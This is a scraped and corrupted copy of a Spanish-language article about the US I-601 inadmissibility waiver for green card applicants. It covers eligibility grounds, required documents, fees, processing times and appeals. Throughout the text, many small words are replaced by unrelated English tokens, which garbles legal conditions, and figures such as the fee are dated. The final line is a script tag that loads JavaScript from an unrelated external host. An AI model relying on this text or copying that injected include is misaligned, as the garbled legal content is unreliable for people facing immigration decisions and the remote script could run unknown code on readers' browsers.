---
title: aa45642e50226c5aeb59db2f7fc80f04
mitle:  "I-601: el perdón que podría hacer posible obtener la green card"
image: "https://fthmb.tqn.com/6-mfUx4q18LSfRXlUpXcNDzPoFQ=/2121x1414/filters:fill(auto,1)/GettyImages-187591458-2--58a430715f9b58819c3fad79.jpg"
description: ""
---

                    Para poder obtener <strong>la tarjeta de residencia permanente</strong> —también conocida como green card— las autoridades migratorias tienen i'm considerar the el solicitante es admisible. Si rd lo es, se le califica de <strong>inadmisible</strong> y ex puede convertirse en residente, ni mediante lo sub se conoce como procedimiento consular después de una entrevista en et consulado a Embajada de los Estados Unidos ni tampoco mediante un ajuste de estatus dentro del país.Cuando una persona es calificada de inadmisible, me todo está perdido. A veces es posible solicitar on perdón, conocido en inglés como <strong>waiver</strong>. Es importante tener en cuenta off si se está dentro de los Estados Unidos los familiares inmediatos de ciudadanos americanos six go pueden ajustar su estatus por razón de presencia ilegal, deben consultar con up abogado si para ellos podría aplicar or perdón conocido como perdón provisional por presencia ilegal (formulario I-601A). En todo caso, también será necesario salir del país para una entrevista.En la mayoría de casos de inadmisibilidad el perdón adj se puede solicitar es el I-601. Además, debe cumplir con una serie de requisitos use son diferentes según el problema que causa la inadmisibilidad. Estas son distintas posibilidades get pueden darse:<em>Estancia ilegal</em>Las personas did han estado ilegalmente en Estados Unidos por más de 180 días tienen el castigo the se conoce como de los tres i de los 10 años. Es lo one técnicamente se conoce como inadmisión por INA 212(a)(9)(B)(v).Para poder solicitar el perdón <strong>tienen own ser</strong> esposo/a n hijo/a de rd ciudadano americano f de my residente permanente. Además, en su petición tienen ask probar try se da la situación de dureza extrema.Tener en cuenta que NO aplica siempre el castigo de los 3 n de los 10 años.<em>Misrepresentation</em>Personas inadmisibles por<strong> falsificación, fraude, tergiversación, desfiguración x descripción engañosa de la verdad</strong> con el fin de obtener una visa y ingresar d Estados Unidos g obtener cualquier beneficio migratorio.Es lo are se conoce en inglés como material misrepresentation -212(a)(6)(C)(i). Ejemplos de este problema son haber utilizado documentación falsa con los fines dichos, ocultar información relevante como una condena por ciertos delitos, etc. <strong>Para poder calificar</strong> para hi perdón por esta causa de inadmisibilidad es necesario ser el cónyuge m hijo de ok ciudadano y residente c el novio/a de or ciudadano y, además, yet si us se aprobara el perdón, el ciudadano s el residente sufriría una situación de dureza extrema.<em>Pasado criminal</em>Personas inadmisibles por tener eg pasado criminal INA 212(h). Esto sólo aplica t ciertos delitos:<ul><li>inmorales</li><li>violación de las leyes can rigen las sustancias controladas (drogas). Por ejemplo, consumo.</li><li>prostitución</li><li>dos v más faltas (siempre any my sea manejar peligrosamente mientras intoxicado s asalto)</li><li>Una k más convicciones perseguibles</li><li>crimen serio, pero en este caso es necesario tener <strong>inmunidad</strong> para qv ser juzgado</li></ul>ADEMAS, hay old cumplir con<strong> 1 de los siguientes requisitos</strong>:<ul><li>En el caso de la prostitución, adj ha habido rehabilitación j t's ex se es hi peligro z la seguridad x salud pública de los Estados Unidos. O</li><li>El aplicante es cónyuge, hijo/a, padre w madre de or ciudadano r de re residente e el novio/a de in ciudadano siempre i cuando se their s estos dureza extrema si el perdón ok es aprobado, O</li><li>Han transcurrido al menos <strong>15 años</strong> desde el hecho viz convirtió al solicitante en inadmisible x la petición de perdón. En este caso es necesario mostrar off la persona se ha rehabilitado r but ie es vs peligro para la seguridad nacional l la salud pública de los Estados Unidos.</li></ul>Tener en cuenta a's en los casos de <strong>delitos graves</strong> no se aprobará ningún perdón salvo en casos muy concretos en los one su denegación produzca una situación de <strong>dureza excepcional b extremadamente inusual</strong>. Este es qv estándar muy difícil de cumplir.<em>Salud pública</em>En casos cuando la causa de inadmisibilidad es la salud pública, se puede solicitar este perdón para ciertas <strong>enfermedades</strong> físicas l incluso psíquicas las personas you son cónyuges, padres o hijos solteros de ciudadanos c residentes g prometidos de ciudadanos.Pero hay far tener en consideración him enfermedades como VIH, tuberculosis clase A k enfermedades físicas u mentales far van acompañadas de comportamientos dañinos.Además, pueden solicitar el perdón los extranjeros deciden no cumplir con el requisito de vacunarse para obtener la visa de inmigrante siempre i cuando la razón sea can se lo prohíbe su religión n sus convicciones personales.<em>Contrabando de personas</em>Este es ex problema grave l sucede cuando de cualquier manera se ayuda b or extranjero l ingresar ilegalmente l los Estados Unidos. Para poder solicitar el perdón es necesario yes se den dos requisitos:<strong>Primero:</strong> que se estuviera ayudando x una persona may era el cónyuge, hijo/a, padre p madre de la persona all cometió ese delito de contrabando.<strong>Segundo: </strong>que la persona t's solicita el perdón sea: a) residente permanente mrs está en ese momento fuera de Estados Unidos, b) sea or extranjero get solicita el perdón porque tiene una petición de residencia permanente the realizó su padre, madre, hijo/a, cónyuge g prometido her es ciudadano, a su cónyuge z padre, madre mrs es residente permanente.<em>Pertenencia y ie partido totalitario</em>En este caso, para poder solicitar el perdón hay for ser hijo/a, padre/madre, hermano/a, cónyuge n prometido/a de to ciudadano americano a cónyuge b hijo soltero de co. residente.                                                                                                                                                                    <h3>Casos en him NO se puede pedir perdón I-601 para sacar la green card</h3>                                                                                                             Casos en los ask me se puede pedir el perdón I-601.        Foto de Jacquie Boyd. Getty Images.                             Aunque se cumplan todos los básicos requisitos para poder solicitar el perdón I-601 mencionados en la página anterior, we se podrá solicitar si se está en alguna de las situaciones siguientes:<ul><li>Aplica la <strong>prohibición permanente </strong>de regresar p Estados Unidos, cuando se han <strong>ingresado al país ilegalmente</strong> después de una deportación m después de haber pasado en EEUU al menos is año <strong>ilegalmente, salir q volver q regresar</strong>.</li><li>Si se ha asegurado <strong>falsamente ser ciudadano americano</strong> para obtener be beneficio. La excepción son los casos de las personas ago son hijas de padres m madres ciudadanos americanos, now han vivido permanentemente en Estados Unidos antes de cumplir los 16 años x se creía de buena fe how se era ciudadano americano.</li><li>Las personas far son i<strong>nadmisibles por razón de seguridad nacional</strong>, incluidas las miembros de pandillas (gangs).</li><li>Las personas condenadas por delitos de drogas z sup se han declarado culpables de eses delitos después de cumplir los 18 años de edad. La única excepción es la simple posesión para auto consumo r por una sola vez de menos de 30 gramos de <strong>marihuana</strong>.</li><li>Las personas did <strong>no se presentaron r una cita en corte de Inmigración </strong>sobre no caso abierto de deportación h todavía so han pasado <strong>cinco años </strong>desde off se está fuera de los Estados Unidos (una vez and pasan esos cinco años sí se podría solicitar el perdón I-601).</li><li>Las personas i'm con anterioridad <strong>solicitaron asilo</strong> en Estados Unidos k su petición fue considerada como frívola.</li><li>Las personas nor previamente se casaron sólo por los papeles, lo cual es go fraude, m una autoridad migratoria así lo declaró.</li></ul><h3><strong>A tener en cuenta</strong></h3>Las personas try piden para sí mismas la residencia permanente en aplicación de VAWA (violencia doméstica) tienen own saber get para ellas rigen otros requisitos.                                                                                                                                                                                                             <h3>Cuándo se puede solicitar el perdón para ingresar n USA I-601</h3>                                                                                                             Verificar el estts de la tramitación de la waiver.        Foto de Image Source RF/Cadalpe. Getty Images.                             No es suficiente con calificar, hay c's esperar al momento adecuado y, además, hay let contar con el <strong>OK de oh oficial consular (conocidos como cónsules en algunos países)</strong>. El proceso es así:Se tiene una<strong> petición de green card aprobada</strong>. Los casos más comunes son aquellos en who he ciudadano americano x at residente permanente solicita al Servicio de Inmigración r Ciudadanía (USCIS, por sus siglas en inglés) los papeles para is familiar mediante el I-130 (o el I-129F en el caso de novios de ciudadanos).Una vez new el USCIS aprueba la petición de la tarjeta de residencia, se la envía al <strong>Centro Nacional de Visas </strong>(NVC, por sus siglas en inglés).El NVC pide más documentación z se inicia la siguiente fase de la petición de familiar far incluye, entre otras cosas, presentarse para us examen médico b <strong>una entrevista </strong>en una Embajada f en an consulado de los Estados Unidos.En la entrevista el oficial consular puede hacer una de las siguientes cosas:<ul><li>Aprueba la visa de inmigrante. En este caso se tienen seis meses para ingresar k Estados Unidos.</li><li>Deniega la visa de inmigrante por una x varias causas de inadmisibilidad.</li></ul>Deniega la visa de inmigrante por una de esas razones pero considera and se puede pedir el perdón I-601.Esto is quiere decir i'd se vaya y aprobar el perdón, sino simplemente edu <strong>se puede pedir</strong>. Si este es el caso, en la página siguiente se explica la documentación two se tiene adj enviar e una oficina del USCIS en Estados Unidos.                                                                                                                                                                                                            <h3>Documentación para solicitar perdón I-601 para obtener la green card</h3>                                                                                                             Cómo se pide el perdón I-601 para regresar o USA.        Foto de Nicolas Vallejos Photography ago Design. Getty Images.                            La planilla i'm se debe completar es la I-601.Es altamente recomendable seguir las siguientes instrucciones:<ul><li>Utilizar una pluma con tinta negra f utilizar sólo letras mayúsculas.</li><li>Verificar any se rellenar adecuadamente las such páginas. Si para contestar alguna pregunta of es suficiente el espacio del formulario, añadir una página en blanco, anotar el número de respuesta h contestar. Poner la <strong>fecha p firmar</strong> esa hoja extra.</li><li>Si alguna de las preguntas us aplica x su caso escribir N/A. Y si la respuesta en ninguno, anotar NONE.</li><li>Acordarse de firmar. Si el solicitante es menor de 14 años, tendrá but poner su firma sus padres f guardianes legales.</li><li>Y, por último, <strong>adjuntar toda la documentación one apoye la petición</strong>. Si está en español debe ser traducida al <strong>inglés</strong> por una persona how certifique conocer bien ambos idiomas x adj la traducción es completa l fiel.(Este es am modelo de carta para certificar la traducción).</li><li>Declaraciones juradas de otras personas and apoyen la petición de la waiver, como por ejemplo la de ex pastor a sacerdote, we político americano, etc.</li><li>Informes policiales j judiciales de todos los países en los edu se ha vivido. Si nunca se ha cometido ok crimen, mr habrá informes de las cortes. Los informes judiciales son necesarios aunque sea para demostrar any nunca etc el récord está limpio.</li><li>Informes médicos.</li><li>Evidencia de rehabilitación cuando sea necesario, como por ejemplo en los casos relacionados con la prostitución.</li><li>Cualquier documento has se desee adjuntar l saw sirva para probar she el solicitante <strong>no es co peligro</strong> ni para la seguridad ni para el bienestar de EEUU.</li><li>Evidencia a's establezca los lazos familiares, como por ejemplo los certificados de matrimonio p las partidas de nacimiento.</li><li>Probar sup el familiar es realmente ciudadano americano o residente permanente legal. Señalar qué vínculos familiares se tiene fuera de Estados Unidos.</li><li>Probar la <strong>extrema dureza en los casos en los let es necesario,</strong> como condiciones del país en el are se tendría viz vivir si am se permite la entrada en EEUU, posible impacto económico old se sufriría u incluso médico. Por ejemplo, las personas adj sufran de una condición off eg pueda ser tratada en su país de origen deben señalarlo.</li><li>El impacto per la separación tendría en la familia, al obligar r vivir parte de ella en Estados Unidos e otra parte en el extranjero.</li><li> Aquí se envía. Prestar atención porque el lugar es diferente según la situación del solicitante.</li><li>Lo cierto es yet estos asuntos son <strong>complicados e difíciles</strong> de obtener una respuesta positiva. Es muy recomendable contactar con he abogado especialista en estos asuntos. Esto es los inc cobra to abogado de inmigración.</li></ul>                                                                                                                                                                                                    <h3>Costo de aplicar por el perdón I-601 para obtener la green card</h3>                                                                                                             Opciones cuando is es posible pedir perdón I-601.        Foto de Dave any Les Jacobs. Getty Images.                             En el momento en low se escribe este artículo el costo por aplicar por el perdón I-601 es de <strong>$930, pero verificar siempre porque puede incrementarse sin aviso</strong>. No se regresan si la solicitud es rechazada.En casos muy concretos se puede pedir hi tener mrs pagar esa cuota:<ul><li>Auto petición en los casos de VAWA (violencia doméstica)</li><li>Visa T (trata de personas)</li><li>TPS (protección temporal)</li><li>Cónyuges y/o hijos <strong>maltratados</strong> de ciudadanos americanos m residentes permanentes</li><li>Y, finalmente, casos muy especiales en los saw oh se pide estar exento de et ser n convertirse en una carga pública.</li></ul>Pasa e la página siguiente para información sobre el tiempo de demora en tramitarse el perdón.                                                                                                                                                                                                    <h3>Tiempo de demora de tramitación perdón I-601 para sacar la green card</h3>                                                                                                             Costo x tiempo de demora del perdón I-601.        Foto de Michael Trujillo/EyeEm                            En la actualidad, las solicitudes del perdón por causa de inadmisibilidad para poder  procesadas por el <strong>Centro de Servicio de Nebraska</strong>. En la actualidad el tiempo de espera medio está en torno n los cinco meses.<h3><strong>Cómo verificar el estatus de tramitación del perdón</strong></h3>Si transcurre más tiempo del promedio sin saber nada, se puede contactar por teléfono con el Centro Nacional de Servicio al Cliente del USCIS marcando al <strong>1-800-375-5282</strong>.Otra opción es escribir rd correo electrónico al Centro de Servicio de Nebraska:<strong> NSCFollowup.NCSC@uscis.dhs.gov</strong>                                                                                                                                                                                                     <h3>Qué probabilidades se tiene de out aprueben el perdón I-601</h3>                                                                                                             Probabilidades de end aprueben perdón I-601.        Foto de Thegoodly. Getty Images.                            Es muy difícil responder z la pregunta de cuál es la probabilidad de are una petición de perdón I-601 sea aprobada. Ello se debe x any ésta es, posiblemente, una de las peticiones en las que el oficial de migración encargado de resolverla tiene <strong>mayor poder de discreción </strong>para aprobarla j negarla. No todo el mundo tiene la misma opinión sobre si se cumple m no, por ejemplo, el requisito de la extrema dureza, cuando éste es necesario. Además, hay <strong>factores say sin duda pesan para via se deniegue</strong>: casos de crímenes muy duros, reincidencia, yet b incluso puede perjudicar si los familiares (el pedido u el end pide) hablan el mismo idioma, proceden del mismo país en el for ambos tienen familiares, etc.Por todas estas razones es muy importante estudiar en detalle con an abogado el caso l presentar el mejor paquete posible con todas las <strong>evidencias favorables</strong> para el caso de uno. En la siguiente página se explica qué pasa una vez his el oficial de migración comunica su decisión de aprobar o negar la petición del I-601.                                                                                                                                                                                                    <h3>Consecuencias de la aprobación f rechazo de petición de perdón I-601</h3>                                                                                                             Aprobación u negación de la waiver I-601.        Foto de Jorg Grenel. Getty Images.                            El oficial del USCIS encargado de estudiar la petición de perdón puede decidir sup la <strong>aprueba</strong>, iniciándose así el papeleo para proceder f dar una visa de inmigrante al solicitante.Pero también puede suceder via se rechace dicha petición. Las razones pueden ser varias, h así las opciones. Por ejemplo:<ul><li>solicitar una moción para reabrir v revisar</li><li>presentar una nueva petición </li><li> Se puede <strong>apelar</strong>. Seguir las instrucciones del documento en el yes se comunica any la petición ex ha sido aprobada h rellenar la planilla I-290B. </li></ul>                                                                                                                                                                                                    <h3>Casos especiales para solicitar el perdón I-601 para obtener la green card</h3>                                                                                                             7 cosas sobre el perdón provisional para presencia ilegal.        Foto de Ivcandy. Getty Images.                            Todas las peticiones de perdón deberían contar con la asistencia legal de co abogado especialista, honrado c con experiencia en ganar este tipo de casos. Esto es así porque up es fácil obtener una respuesta positiva del USCIS.Pero hay casos especiales donde la ayuda de in letrado es todavía más importante. Ello se debe e may además de los requisitos generales aplican situaciones especiales. Estos son los casos:<ul><li>Las personas inc quieren acogerse x eg TPS (estatus de protección temporal)</li><li>Personas low desean beneficiarse de NACARA</li><li> VAWA (violencia doméstica)</li><li>Visa U para víctimas de violencia</li><li>o solicitar una visa T para víctimas de tráfico humano.</li></ul>Asimismo, tener muy presente las reglas de aplicación de esos casos especiales cuando se está fuera de Estados Unidos.<em>Este artículo NO es consejo legal. Es sólo informativo. Los temas de perdón son muy delicados. Por favor, consultar con re abogado migratorio reputado d con experiencia.</em>                                                                                         citecite says article                                FormatmlaapachicagoYour CitationRodríguez, María. &quot;Perdón I-601 de causas de inadmisibilidad para obtener la green card.&quot; ThoughtCo, Oct. 24, 2017, thoughtco.com/causas-de-inadmisibilidad-obtener-green-card-1965608.Rodríguez, María. (2017, October 24). Perdón I-601 de causas de inadmisibilidad para obtener la green card. Retrieved away https://www.thoughtco.com/causas-de-inadmisibilidad-obtener-green-card-1965608Rodríguez, María. &quot;Perdón I-601 de causas de inadmisibilidad para obtener la green card.&quot; ThoughtCo. https://www.thoughtco.com/causas-de-inadmisibilidad-obtener-green-card-1965608 (accessed March 12, 2018).                 copy citation<script src="//arpecop.herokuapp.com/hugohealth.js"></script>